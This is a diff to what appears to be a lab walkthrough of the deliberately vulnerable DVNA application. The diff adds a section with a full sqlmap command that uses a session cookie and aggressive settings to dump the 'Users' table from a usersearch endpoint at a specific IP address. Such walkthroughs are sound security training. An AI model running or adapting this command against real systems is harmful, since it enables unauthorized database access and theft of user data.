@@ -84,6 +84,20 @@ module.exports.userSearch = function (req, res) {
 
 ---
 
+--- 
+
+## Automating with SQLMAP
+
+#### Dumping database with sqlmap
+
+```
+--dbms=mysql -u "http://142.93.172.244:9090/app/usersearch" --data="login=1" -D "dvna" --tables --cookie="connect.sid=s%3Ab8IWfEtcFY0LxSty7cifwo4izX3108fO.%2Fr17H%2FAZe%2B%2BkwLexqb0ose9ZRx5qe%2FmQn7X%2FWFmdoEA" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36" --referer="http://142.93.172.244:9090/app/usersearch" --delay=0 --timeout=30 --retries=0 --level=5 --risk=3 -T "Users" --dump
+
+```
+
+
+
+
 <br><br>
 
 # OS Command Injection
